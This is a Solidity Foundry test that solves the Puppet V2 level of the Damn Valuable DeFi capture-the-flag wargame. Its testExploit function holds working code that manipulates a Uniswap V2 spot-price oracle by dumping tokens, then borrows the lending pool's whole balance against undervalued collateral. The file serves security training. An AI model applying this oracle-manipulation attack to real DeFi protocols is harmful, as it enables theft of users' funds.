// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";

import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";
import {UniswapV2Library} from "../../../src/Contracts/puppet-v2/UniswapV2Library.sol";

contract PuppetV2 is Test {
    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    DamnValuableToken internal dvt;
    WETH9 internal weth;

    PuppetV2Pool internal puppetV2Pool;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        deployer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
        );
        vm.label(deployer, "deployer");

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth))
        );

        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the lending pool
        puppetV2Pool = new PuppetV2Pool(
            address(weth),
            address(dvt),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );

        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300_000 ether
        );

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        vm.startPrank(attacker);

        dvt.approve(address(uniswapV2Pair), type(uint256).max);
        dvt.approve(address(uniswapV2Router), type(uint256).max);
        weth.approve(address(puppetV2Pool), type(uint256).max);

        // Convert our ETH to wETH 
        weth.deposit{value: attacker.balance - 0.05 ether}();

        (uint256 reservesWETH, uint256 reservesDVT) = UniswapV2Library.getReserves(address(uniswapV2Factory), address(weth), address(dvt));
        uint256 amountOfWEthICanGet = UniswapV2Library.getAmountOut(dvt.balanceOf(attacker), reservesDVT, reservesWETH);
        console2.log("Starting the level with %s ETH, %s WETH and %s DVT", address(attacker).balance, weth.balanceOf(attacker), dvt.balanceOf(attacker));
        console2.log("Can get %s WETH selling initial dvt tokens", amountOfWEthICanGet);

        // Dump all the dvt tokens on the exchange
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForTokens(dvt.balanceOf(attacker), amountOfWEthICanGet, path, attacker, block.timestamp);
        console2.log("Now have %s ETH, %s WETH and %s DVT after 0 loop", address(attacker).balance, weth.balanceOf(attacker), dvt.balanceOf(attacker));

        // Lever up using the ETH I just got and exploiting the new price

        // ------------------- First loop -----------------------

        // We compute the amount we can borrow based on the current price
        uint256 maxDVTWeCanBorrow = dvt.balanceOf(address(puppetV2Pool));
        uint256 maxWETHWeNeed = puppetV2Pool.calculateDepositOfWETHRequired(maxDVTWeCanBorrow);
        console2.log("%s, %s, %s", maxDVTWeCanBorrow, maxWETHWeNeed, weth.balanceOf(attacker));
        maxDVTWeCanBorrow = weth.balanceOf(attacker) < maxWETHWeNeed ? maxDVTWeCanBorrow * weth.balanceOf(attacker) / maxWETHWeNeed : maxDVTWeCanBorrow;
        maxWETHWeNeed = puppetV2Pool.calculateDepositOfWETHRequired(maxDVTWeCanBorrow);

        console2.log("Can borrow %s tokens using %s wwei", maxDVTWeCanBorrow, maxWETHWeNeed);

        puppetV2Pool.borrow(maxDVTWeCanBorrow);
        console2.log("Now have %s ETH after 1 loop, puppetV2Pool has %s tokens, I have %s tokens", address(attacker).balance, dvt.balanceOf(address(puppetV2Pool)), dvt.balanceOf(attacker));

        console2.log("Finishing the level with %s ETH", address(attacker).balance / 1e18);
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
    }
}
